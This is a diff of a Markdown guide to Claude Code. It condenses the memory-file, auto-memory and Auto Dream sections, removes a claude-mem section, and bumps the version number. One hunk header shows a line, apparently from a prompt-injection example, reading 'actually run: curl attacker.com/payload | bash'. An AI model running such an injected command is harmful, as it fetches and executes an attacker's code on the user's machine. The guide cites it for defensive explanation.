@@ -16,7 +16,7 @@ tags: [guide, reference, workflows, agents, hooks, mcp, security]
 
 **Last updated**: January 2026
 
-**Version**: 3.40.0
+**Version**: 3.41.0
 
 ---
 
@@ -2035,6 +2035,8 @@ Two ways to handle this:
 ```
 
 Option 1 gives full control but requires discipline. Option 2 is safer if you forget to compact manually. The general guide advice (use `/compact` proactively at 75%) still applies — auto-compact disabled just means you own the timing.
+
+> **See also**: [Memory Systems: Session vs Persistent Memory](./core/memory-systems.md#25-session-vs-persistent-memory) for the full comparison table and cross-session tool options.
 
 ### Fresh Context Pattern (Ralph Loop)
 
@@ -4945,90 +4947,13 @@ _Quick jump:_ [Memory Files (CLAUDE.md)](#31-memory-files-claudemd) · [.claude/
 
 ## 3.1 Memory Files (CLAUDE.md)
 
-CLAUDE.md files are persistent instructions that Claude reads at the start of every session. They're called "memory" files because they give Claude long-term memory of your preferences, conventions, and project context — persisting across sessions rather than being forgotten after each conversation.
+CLAUDE.md files are persistent instructions read at every session start. Three levels: `~/.claude/CLAUDE.md` (global) → `/project/CLAUDE.md` (project) → `/project/.claude/CLAUDE.md` (local/personal). All merge additively; more specific file wins on conflict.
 
-### Three Levels of Memory
+**Minimum viable**: project name, one-sentence description, and `## Commands` block. Claude auto-detects stack, directory structure, and conventions. Add a line only when Claude makes the same mistake twice — not preemptively.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    MEMORY HIERARCHY                     │
-├─────────────────────────────────────────────────────────┤
-│                                                         │
-│   ~/.claude/CLAUDE.md          (Global - All projects)  │
-│        │                                                │
-│        ▼                                                │
-│   /project/CLAUDE.md           (Project - This repo)    │
-│        │                                                │
-│        ▼                                                │
-│   /project/.claude/CLAUDE.md   (Local - Personal prefs) │
-│                                                         │
-│   All files are merged additively.                      │
-│   On conflict: more specific file wins.                 │
-│                                                         │
-└─────────────────────────────────────────────────────────┘
-```
+**The anchoring risk**: stale CLAUDE.md entries bias every session toward outdated patterns. Treat pruning as maintenance. Structure around WHAT/WHY/HOW for larger projects.
 
-**Additional discovery**: In monorepos, parent directory CLAUDE.md files are automatically pulled in, and child directory CLAUDE.md files are loaded on demand when Claude works with files in those directories. See [CLAUDE.md in Monorepos](#claudemd-in-monorepos) for details.
-
-**Personal overrides**: For personal instructions not committed to Git, you have two options:
-- `/project/.claude/CLAUDE.md` (add to `.gitignore`)
-- `/project/CLAUDE.md.local` (automatically gitignored by convention)
-
-### Minimum Viable CLAUDE.md
-
-Most projects only need three things in their CLAUDE.md:
-
-```markdown
-# Project Name
-
-Brief one-sentence description of what this project does.
-
-## Commands
-- `pnpm dev` - Start development server
-- `pnpm test` - Run tests
-- `pnpm lint` - Check code style
-```
-
-**That's it for most projects.** Claude automatically detects:
-- Tech stack (from package.json, go.mod, Cargo.toml, etc.)
-- Directory structure (via exploration)
-- Existing conventions (from the code itself)
-
-**Add more only when needed**:
-- Non-standard package manager (yarn, bun, pnpm instead of npm)
-- Custom commands that differ from standard (`npm run build` → `make build`)
-- Project-specific conventions that conflict with common patterns
-- Architecture decisions that aren't obvious from the code
-
-**Rule of thumb**: If Claude makes a mistake twice because of missing context, add that context to CLAUDE.md. Don't preemptively document everything — and don't ask Claude to generate it for you either. Auto-generated CLAUDE.md files tend to be generic, bloated, and filled with things Claude already detects on its own.
-
-> **Research Note (Feb 2026)**: ETH Zürich published the first empirical evaluation of agent context files across 138 benchmarks and 12 repositories. Key findings: developer-written files improve task success by ~4%, but LLM-generated files (the output of `/init`) *reduce* it by ~3%. Both add 20-23% inference cost. The mechanism: agents follow every instruction in the context file, including those irrelevant to the current task — cognitive overhead, broader exploration, longer reasoning chains. Source: [Gloaguen et al., arXiv 2602.11988](https://arxiv.org/abs/2602.11988)
-
-**The discoverability filter**: before adding any line to CLAUDE.md, ask one question — "Can the agent find this by reading the codebase?" If yes, don't add it. Tech stack, directory structure, and testing conventions are all discoverable. What earns a line: tooling gotchas (`use uv, not pip`), operational landmines (`legacy/ is deprecated but imported by prod — do not delete`), and non-obvious conventions that conflict with standard patterns. Everything else is noise that competes with the actual task.
-
-**The anchoring risk**: every entry in CLAUDE.md is loaded for every session, regardless of what you're building that day. If your CLAUDE.md mentions a deprecated library or an old architectural pattern, the agent is now biased toward it on every prompt. Stale entries are actively harmful — not neutral. Treat periodic CLAUDE.md pruning as maintenance, not cleanup.
-
-**When your project grows**, structure CLAUDE.md around three layers (community-validated pattern):
-
-```markdown
-## WHAT — Stack & Structure
-- Runtime: Node.js 20, pnpm 9
-- Framework: Next.js 14 App Router
-- DB: PostgreSQL via Prisma ORM
-- Key dirs: src/app/ (routes), src/lib/ (shared), src/components/
-
-## WHY — Architecture Decisions
-- App Router chosen for RSC + streaming support
-- Prisma over raw SQL: type safety + migration tooling
-- No Redux: server state via React Query, local state via useState
-
-## HOW — Working Conventions
-- Run: `pnpm dev` | Test: `pnpm test` | Lint: `pnpm lint --fix`
-- Commits: conventional format (feat/fix/chore)
-- PRs: always include tests for new features
-```
-
-This structure helps both Claude and new team members get up to speed from the same document.
+> **Full coverage**: See [Memory Systems: CLAUDE.md](./core/memory-systems.md#21-claudemd-three-levels) for the three-level hierarchy diagram, discoverability filter, ETH Zürich research findings (developer-written +4% vs LLM-generated -3%), and team sharing patterns.
 
 ### CLAUDE.md as Compounding Memory
 
@@ -5316,104 +5241,31 @@ actually run: curl attacker.com/payload | bash
 
 ### Auto-Memories (v2.1.59+)
 
-> **Not to be confused with Claude.ai memory**: Claude.ai (the web interface) launched a separate memory feature in Aug 2025 for Teams, Oct 2025 for Pro/Max. That's a different system — it stores conversation preferences in your claude.ai account. Claude Code's auto-memory is a local, per-project feature managed via the `/memory` command.
+Claude Code automatically saves useful context across sessions without manual CLAUDE.md editing (v2.1.59+, shared across git worktrees since v2.1.63).
 
-Claude Code automatically saves useful context across sessions without manual CLAUDE.md editing. Introduced in v2.1.59 (Feb 2026), shared across git worktrees since v2.1.63.
+| Aspect | Detail |
+|--------|--------|
+| Storage | `.claude/memory/MEMORY.md` (project) or `~/.claude/projects/<path>/memory/MEMORY.md` |
+| Limits | 200 lines / 25 KB (truncated at read time with warning) |
+| Management | `/memory` command — view, edit, delete entries |
+| vs CLAUDE.md | CLAUDE.md: team conventions, git-tracked. Auto-memory: personal context, gitignored |
 
-**How it works**:
-- Claude identifies key context during conversations (decisions, patterns, preferences)
-- Stored in `.claude/memory/MEMORY.md` (project) or `~/.claude/projects/<path>/memory/MEMORY.md` (global)
-- Automatically recalled in future sessions for the same project
-- Manage with `/memory`: view, edit, or delete stored entries
-
-**File limits** (enforced at read time):
-
-| Limit | Value | Behavior when exceeded |
-|-------|-------|------------------------|
-| `MEMORY.md` max lines | 200 lines | Truncated at line 200, warning appended |
-| `MEMORY.md` max size | 25 KB | Truncated at last newline before 25 KB, warning appended |
-| Memory directory | 200 files | Oldest files pruned when limit is reached |
-
-Line truncation happens first; if the file is still over 25 KB after line truncation, byte truncation is applied at the last complete line. Both truncations append a warning comment so you can see that content was cut. The Auto Dream consolidation process keeps `MEMORY.md` under the 200-line cap as part of its Phase 4 pruning step.
-
-**What gets remembered** (examples):
-- Architectural decisions: "We use Prisma for database access"
-- Preferences: "This team prefers functional components over class components"
-- Project-specific patterns: "API routes follow RESTful naming in `/api/v1/`"
-- Known issues: "Don't use package X due to version conflict with Y"
-
-**Difference from CLAUDE.md**:
-
-| Aspect | CLAUDE.md | Auto-Memories |
-|--------|-----------|---------------|
-| **Management** | Manual editing | Automatic capture via `/memory` |
-| **Source** | Explicit documentation | Conversation analysis |
-| **Visibility** | Git-tracked, team-shared | Local per-user, gitignored |
-| **Worktrees** | Shared (v2.1.63+) | Shared across same repo (v2.1.63+) |
-| **Best for** | Team conventions, official decisions | Personal workflow patterns, discovered insights |
-
-**Recommended workflow**:
-- **CLAUDE.md**: Team-level conventions everyone must follow
-- **Auto-memories**: Personal discoveries and session context
-- **When in doubt**: Document in CLAUDE.md for team visibility — auto-memories are not committed to git
+> **Full coverage**: See [Memory Systems: Auto Memory](./core/memory-systems.md#22-auto-memory-v21594) for limits breakdown, CLAUDE.md vs Auto-Memory comparison, and recommended workflow.
 
 ### Auto Dream: Memory Consolidation (Community-Discovered)
 
-> **Community-discovered feature, not in official Anthropic release notes.** Sourced from reverse-engineering by [Piebald-AI/claude-code-system-prompts](https://github.com/Piebald-AI/claude-code-system-prompts/blob/main/system-prompts/agent-prompt-dream-memory-consolidation.md). Controlled by a server-side feature flag (`tengu_onyx_plover`) — `autoDreamEnabled: true` in `settings.json` exists but cannot override the server default. Rolling out gradually as of v2.1.83+. Behavior may vary until full release.
+Background sub-agent that consolidates MEMORY.md between sessions — the system prompt literally says "You are performing a dream." Triggers when both conditions are met: ≥24 hours since last run AND ≥5 sessions elapsed.
 
-After 20+ sessions without curation, auto-memory degrades: stale context, contradictory facts, relative dates that lose meaning ("yesterday's refactor" is meaningless two weeks later). Auto Dream runs as a background sub-agent between sessions to consolidate and prune — the system prompt literally says: *"You are performing a dream — a reflective pass over your memory files."*
+| Phase | Action |
+|-------|--------|
+| Orient | Reads memory directory and existing topic files |
+| Gather Signal | Targeted grep of session transcripts |
+| Consolidate | Merges signal, converts relative dates, removes contradicted facts |
+| Prune & Index | Rebuilds MEMORY.md under 200-line cap |
 
-**Built on top of Auto-Memory (v2.1.59+).** Theoretical foundation: ["Sleep-time Compute: Beyond Inference Scaling at Test-time"](https://arxiv.org/html/2504.13171v1) (UC Berkeley + Letta, April 2025), which showed that pre-computing during idle periods reduces test-time compute by ~5x. The biological parallel is deliberate — REM sleep consolidates short-term memory into long-term storage by pruning weak connections and strengthening important ones.
+Trigger via `/memory` or natural language: "consolidate my memory files". The `/dream` command exists in the UI but returns "Unknown skill" on most installs — use natural language instead.
 
-**Trigger conditions** (both must be met):
-
-| Condition | Default |
-|-----------|---------|
-| Time since last consolidation | ≥ 24 hours |
-| Sessions since last consolidation | ≥ 5 |
-
-Configuration extracted from the binary: `{ "minHours": 24, "minSessions": 5, "enabled": false }`. The `enabled` field is server-controlled. A lock file prevents concurrent runs on the same project.
-
-**The 4 phases**:
-
-| Phase | Name | What happens |
-|-------|------|--------------|
-| 1 | **Orient** | Lists the memory directory, reads the index, skims existing topic files to map current state |
-| 2 | **Gather Signal** | Targeted grep of session JSONL transcripts — not exhaustive reads. The prompt instructs: *"Look only for things you already suspect matter."* Prioritizes daily logs, drifted memories (facts contradicting current code), then transcripts |
-| 3 | **Consolidate** | Merges new signal into existing topic files (never creates near-duplicates), converts relative dates to absolute, removes contradicted facts at source, deduplicates overlapping entries |
-| 4 | **Prune & Index** | Rebuilds MEMORY.md under the 200-line cap, removes stale pointers, enforces index entry format (`- [Title](file.md) — one-line hook`, ~150 chars max), returns a brief summary of changes |
-
-**Observed performance**: One documented run consolidated 913 sessions in ~9 minutes. Typical result: MEMORY.md goes from 280+ lines to ~140 lines.
-
-**Safety constraints**: Read-only on project source code. Write access limited to memory files only.
-
-**How to access**:
-
-```
-/memory          → Shows AutoDream status and toggle
-```
-
-The `/dream` command is referenced in the UI but returns "Unknown skill: dream" on most installations (issues [#38461](https://github.com/anthropics/claude-code/issues/38461), [#38426](https://github.com/anthropics/claude-code/issues/38426) — fix tracked in PR #39299). Manual trigger via natural language works instead:
-
-```
-"dream"
-"auto dream"
-"consolidate my memory files"
-```
-
-**Known quality gaps** (issue [#38493](https://github.com/anthropics/claude-code/issues/38493), opened March 2026):
-
-| Gap | Problem | Concrete example |
-|-----|---------|-----------------|
-| **Identity** | Names memory files from session content, not project path | Rename `my-old-project/` → orphaned files undetected |
-| **Accuracy** | Writes unverified facts without reading source files | "18 of 21 items resolved" written without checking the file |
-| **Transparency** | No audit trail — impossible to see what changed without manual diffing | Must compare folders before/after to understand a run |
-
-Proposed fix: a `.dream-log.md` per run listing files created, modified, removed, and conflicts resolved.
-
-**When Auto Dream matters**: Projects where memory is written but never manually curated — active development teams, long-running projects with 50+ sessions, or any context where MEMORY.md exceeds 150 lines with no cleanup. If you actively manage your memory files (regular pruning, explicit saves), Auto Dream is largely redundant.
-
-**Community implementations**: [dream-skill](https://github.com/grandamenium/dream-skill) (open-source replication with 4-phase consolidation) and [ai-dream](https://github.com/VoidLight00/ai-dream) (alternative implementation documenting `autoDreamEnabled`).
+> **Full coverage**: See [Memory Systems: Auto Dream](./core/memory-systems.md#23-auto-dream-background-consolidation) for trigger conditions, 4-phase breakdown, quality gaps, and community implementations.
 
 ### Single Source of Truth Pattern
 
@@ -5648,7 +5500,7 @@ The `.claude/` folder is your project's Claude Code directory for memory, settin
 | Personal preferences | `CLAUDE.md` | ❌ Gitignore |
 | Personal permissions | `settings.local.json` | ❌ Gitignore |
 
-### 3.40.0 Version Control & Backup
+### 3.41.0 Version Control & Backup
 
 **Problem**: Without version control, losing your Claude Code configuration means hours of manual reconfiguration across agents, skills, hooks, and MCP servers.
 
@@ -6997,6 +6849,8 @@ This pattern — skills for static startup knowledge, memory for dynamic accumul
 | Agent for a client project you do not want to mix with personal knowledge | `local` — isolated, not committed |
 
 > **Sources**: [Create custom subagents](https://code.claude.com/docs/en/sub-agents) · [Manage Claude's memory](https://code.claude.com/docs/en/memory) · Claude Code v2.1.33 release notes
+
+> **See also**: [Memory Systems: Agent Memory Frontmatter](./core/memory-systems.md#24-agent-memory-frontmatter) for MEMORY.md structure, 200-line injection details, and prompting patterns.
 
 ---
 
@@ -12116,261 +11970,6 @@ Run this before starting any refactor touching a function used in 3+ places — 
 > **Full coverage**: See [Memory Systems: claude-mem](./core/memory-systems.md#31-claude-mem) for full architecture breakdown, observation types, progressive disclosure workflow, privacy controls, and cost comparison table.
 
 > **Source**: [GitHub: thedotmack/claude-mem](https://github.com/thedotmack/claude-mem) (26.5K stars, AGPL-3.0)
-
----DELETEME2---
-
-```
-Session Lifecycle (hooks → worker → storage):
-
-┌─────────────────────┬──────────────────────────┬──────────────────────────────────────┐
-│ Moment              │ Hook                     │ Action                               │
-├─────────────────────┼──────────────────────────┼──────────────────────────────────────┤
-│ Session starts      │ SessionStart             │ Worker boots, injects last N sessions│
-│ First prompt        │ UserPromptSubmit         │ Creates/identifies current session   │
-│ After each tool use │ PostToolUse (matcher: *) │ Captures typed observation           │
-│ End of response     │ Stop                     │ Generates LLM summary                │
-│ Session ends        │ SessionEnd               │ Marks session complete               │
-└─────────────────────┴──────────────────────────┴──────────────────────────────────────┘
-
-Worker Pipeline (Bun, port 37777):
-
-  Claude Code tool call
-         │
-         ▼
-  LLM analysis (Gemini 2.5 Flash Lite)
-         │
-         ├── type: DISCOVERY / CHANGE / FEATURE / BUGFIX
-         ├── facts: files touched, patterns detected
-         └── narrative: generated summary
-         │
-         ▼
-  SQLite (~/.claude-mem/claude-mem.db)
-         ├── [optional] Chroma vector search (port 8000, fallback: SQLite FTS)
-         └── Web UI at localhost:37777 + MCP skills
-```
-
-**Observation Types**:
-
-| Type | When generated | Example |
-|------|---------------|---------|
-| `DISCOVERY` | Reading/exploring code | "Explored auth module, found JWT in validateToken()" |
-| `CHANGE` | File edits | "Modified session.middleware.ts: added refresh logic" |
-| `FEATURE` | New functionality | "Implemented OAuth2 flow in auth.service.ts" |
-| `BUGFIX` | Bug corrections | "Fixed null pointer in UserController.getById()" |
-
-**Installation**:
-
-```bash
-# Via plugin marketplace (recommended)
-/plugin marketplace add thedotmack/claude-mem
-/plugin install claude-mem
-
-# Restart Claude Code
-# claude-mem automatically activates on next session
-```
-
-**Basic Usage**:
-
-Once installed, claude-mem works **automatically**—no manual commands needed. It captures all tool operations and injects relevant context at session start.
-
-**Available Skills** (`/claude-mem:*`):
-
-| Skill | Purpose |
-|-------|---------|
-| `mem-search` | Search session history: "How did we solve the CORS issue?" |
-| `smart-explore` | AST-based codebase exploration (token-efficient, avoids full file reads) |
-| `make-plan` | Creates a phased implementation plan with doc discovery |
-| `do` | Executes a plan created by `make-plan` via sub-agents |
-| `timeline-report` | Generates a "Journey Into [Project]" narrative over full history |
-
-**Natural Language Search** (via `mem-search` skill):
-
-```bash
-# Search your session history
-"Search my memory for authentication decisions"
-"What files did we modify for the payment bug?"
-"Remind me why we chose Zod over Yup"
-```
-
-**Web Dashboard**:
-
-```bash
-# Access real-time UI
-open http://localhost:37777
-
-# Features:
-# - Timeline view of all sessions
-# - Natural language search
-# - Observation details
-# - Session statistics
-```
-
-**Progressive Disclosure Workflow**:
-
-claude-mem uses a 3-layer approach to minimize token consumption:
-
-```
-Layer 1: Search (50-100 tokens)
-├─ "Find sessions about authentication"
-├─ Returns: 5 relevant session summaries
-│
-Layer 2: Timeline (500-1000 tokens)
-├─ "Show timeline for session abc123"
-├─ Returns: Chronological observation list
-│
-Layer 3: Details (full context)
-└─ "Get observation details for obs_456"
-    Returns: Complete tool call + result
-```
-
-**Result**: ~10x token reduction vs loading full session history.
-
-**Privacy Controls**:
-
-```markdown
-<!-- In your prompts -->
-<private>
-Database credentials: postgres://prod-db-123
-API key: sk-1234567890abcdef
-</private>
-
-<!-- claude-mem excludes <private> content from storage -->
-```
-
-**Security Warning**:
-
-> ⚠️ `GET /api/settings` returns your API keys in plain text. Any process running on your machine (browser extension with localhost access, npm package, another CLI tool) can read this endpoint without authentication. Localhost is not a security boundary.
->
-> **Mitigation**: Set `host: "127.0.0.1"` (not `"0.0.0.0"`) in your config. Never run on a shared machine or expose the port to your network. Consider using CLI auth (`auth_method: cli`) instead of storing keys in settings.json.
-
-**Cost Considerations**:
-
-| Aspect | Cost | Notes |
-|--------|------|-------|
-| **API compression** | ~$0.15 per 100 observations | AI summarization (model configurable) |
-| **Storage** | Free (local SQLite) | 10-20 MB/month (light use), 100-200 MB/month (heavy use) |
-| **Queries** | Free (local vectors) | Chroma indexation runs locally |
-
-**Typical monthly cost**: $5-15 for heavy users (100+ sessions/month)
-
-**Cost optimization — use Gemini instead of Claude for compression**:
-
-By default, claude-mem uses Claude (Haiku) for AI summarization. You can configure Gemini 2.5 Flash Lite instead for significant cost savings:
-
-```bash
-# In ~/.claude-mem/settings.json
-{
-  "provider": "gemini",
-  "model": "gemini-2.5-flash-lite",
-  "auth_method": "cli"
-}
-```
-
-| Model | Cost/month (~400 sessions) | Quality | Savings |
-|-------|---------------------------|---------|---------|
-| Claude Haiku (default) | ~$102 | High | — |
-| Gemini 2.5 Flash | ~$14 | Good | **-86%** |
-| Gemini 2.5 Flash Lite | ~$14 | Adequate | **-86%** |
-
-> **Flash vs Flash Lite**: Flash Lite is cheaper but produces weaker compressions. Context injected at session start will be less precise. For most users the tradeoff is acceptable; for complex multi-week projects, consider Gemini 2.5 Flash (non-Lite) to preserve compression quality.
-
-If you're running claude-mem at scale, switching to Gemini is the single highest-ROI configuration change.
-
-**Critical installation gotcha — hooks coexistence**:
-
-claude-mem adds hooks on `SessionStart`, `PostToolUse`, `Stop`, and `SessionEnd`. If you already have hooks in `settings.json`, **claude-mem will not automatically merge them** — it will overwrite the hooks arrays.
-
-Before installing:
-1. Back up your current `settings.json`
-2. Note all existing hooks (PostToolUse, UserPromptSubmit arrays)
-3. After installation, manually verify the hooks arrays contain both your existing hooks AND the new claude-mem hooks
-
-```json
-// ✅ Correct — both hooks coexist
-"hooks": {
-  "PostToolUse": [
-    {"matcher": "...", "hooks": [{"type": "command", "command": "your-existing-hook.sh"}]},
-    {"matcher": "...", "hooks": [{"type": "command", "command": "claude-mem-hook.sh"}]}
-  ]
-}
-
-// ❌ Wrong — claude-mem silently replaced your hooks
-"hooks": {
-  "PostToolUse": [
-    {"matcher": "...", "hooks": [{"type": "command", "command": "claude-mem-hook.sh"}]}
-  ]
-}
-```
-
-**Reliability: fail-open architecture (v9.1.0+)**:
-
-If the claude-mem worker process is down (crash, restart, port conflict), Claude Code continues working normally — it does not block or error. Sessions simply aren't captured until the worker restarts.
-
-```bash
-# Check worker status
-open http://localhost:37777  # dashboard — if unreachable, worker is down
-
-# Restart worker manually if needed
-npx claude-mem@latest start
-```
-
-This fail-open behavior makes claude-mem safe to install in production workflows — a dead worker never blocks your work.
-
-**Limitations**:
-
-| Limitation | Impact | Workaround |
-|------------|--------|------------|
-| **CLI only** | No web interface, no VS Code | Use Claude Code CLI exclusively |
-| **No cloud sync** | Can't sync between machines | Manual export/import via `claude-mem export` |
-| **AGPL-3.0 license** | Commercial restrictions, source disclosure | Check license compliance for commercial use |
-| **Manual privacy tags** | Must explicitly mark sensitive data | Use `<private>` tags consistently |
-
-**Use when**:
-- Working on projects >1 week with multiple sessions
-- Need to remember architectural decisions across days/weeks
-- Frequently ask "what did we do last time?"
-- Want to avoid re-reading files for context
-- Value automatic capture over manual note-taking
-
-**Don't use when**:
-- One-off quick tasks (<10 minutes)
-- Extremely sensitive data (consider manual Serena instead)
-- Commercial projects without AGPL compliance review
-- Need cross-machine sync (not supported)
-
-**Example: Multi-Day Refactoring**:
-
-```
-Day 1 (Session 1):
-User: "Explore auth module"
-Claude: [Reads auth.service.ts, session.middleware.ts]
-claude-mem: Captures "Auth exploration: JWT validation, session management"
-
-Day 2 (Session 2):
-Claude: [Auto-injected context]
-"Previously: Explored auth module. Files: auth.service.ts, session.middleware.ts.
- Key finding: JWT validation in validateToken()"
-User: "Refactor auth to use jose library"
-Claude: [Already has context, no re-reading needed]
-
-Day 3 (Session 3):
-Claude: [Auto-injected context]
-"Day 1: Auth exploration. Day 2: Refactored to jose library.
- Decision: Chose jose over jsonwebtoken (lighter, 40% fewer deps)"
-User: "Add tests for auth refactoring"
-Claude: [Full context of decisions and changes]
-```
-
-**Stats** (updated 2026-03-30):
-- **26.5k GitHub stars**, 1.8k forks
-- 46 contributors
-- Latest: v10.6.3
-- License: AGPL-3.0 + PolyForm Noncommercial
-
-> **Sources**:
-> - [GitHub: thedotmack/claude-mem](https://github.com/thedotmack/claude-mem)
-> - [Guide: Progressive Disclosure](https://corti.com/claude-mem-persistent-memory-for-ai-coding-assistants/)
-> - [Video: 5-Minute Setup](https://www.youtube.com/watch?v=ryqpGVWRQxA)
 
 ---
 
@@ -26129,4 +25728,4 @@ We'll evaluate and add it to this section if it meets quality criteria.
 
 **Contributions**: Issues and PRs welcome.
 
-**Last updated**: January 2026 | **Version**: 3.40.0
+**Last updated**: January 2026 | **Version**: 3.41.0
